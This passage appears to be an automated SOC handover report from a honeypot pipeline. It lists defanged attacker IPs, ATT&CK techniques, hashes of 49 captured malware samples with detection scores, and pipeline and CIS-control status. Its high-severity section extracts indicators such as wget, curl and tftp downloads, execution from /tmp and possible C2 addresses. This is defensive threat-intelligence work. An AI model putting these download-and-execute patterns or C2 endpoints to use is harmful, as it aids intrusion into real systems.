| `139.19.117[.]129` | 1 | 2026-07-09 18:47 | 2026-07-09 18:47 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.53[.]200` | 1 | 2026-07-09 17:20 | 2026-07-09 17:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]151` | 1 | 2026-07-09 18:00 | 2026-07-09 18:00 | 4s | 0 | `T1592` | 🟢 LOW |
| `218.200.9[.]182` | 1 | 2026-07-09 17:53 | 2026-07-09 17:54 | 29s | 0 | `T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-07-09 18:10 | 2026-07-09 18:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.133.214[.]135` | 1 | 2026-07-09 17:23 | 2026-07-09 17:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.249.193[.]242` | 1 | 2026-07-09 18:14 | 2026-07-09 18:14 | 34s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]120` | 1 | 2026-07-09 18:52 | 2026-07-09 18:52 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]152` | 1 | 2026-07-09 17:39 | 2026-07-09 17:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-09 18:35 | 2026-07-09 18:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.77.69[.]201` | 1 | 2026-07-09 17:47 | 2026-07-09 17:47 | 4s | 0 | `T1592` | 🟢 LOW |
| `47.95.234[.]23` | 1 | 2026-07-09 17:00 | 2026-07-09 17:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `47.99.146[.]188` | 1 | 2026-07-09 18:34 | 2026-07-09 18:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-09 17:15 | 2026-07-09 17:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-09 17:18 | 2026-07-09 17:20 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `122.187.227[.]145` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 50 |
| `46.151.182[.]31` | LU | Ghosty Networks LLC | **100** ⚠️ | 19 |
| `187.115.144[.]103` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `47.99.146[.]188` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 5 |
| `36.133.214[.]135` | CN | China Mobile Communications Corporation | **100** ⚠️ | 16 |
| `185.242.3[.]195` | DE | Felcloud | **100** ⚠️ | 50 |
| `101.13.4[.]128` | TW | Taiwan Mobile Co., Ltd. | **100** ⚠️ | 50 |
| `118.163.145[.]175` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 30 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 151 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 137 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 65 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 65 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 65 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 243 cases |
| Tool 34  | Credential Extractor        | ✅ 162 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 73 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (6.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 136 priority case(s) shown individually · 23 recon entry/entries in table (6 group(s) consolidating 74 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-09T20:00:49Z_
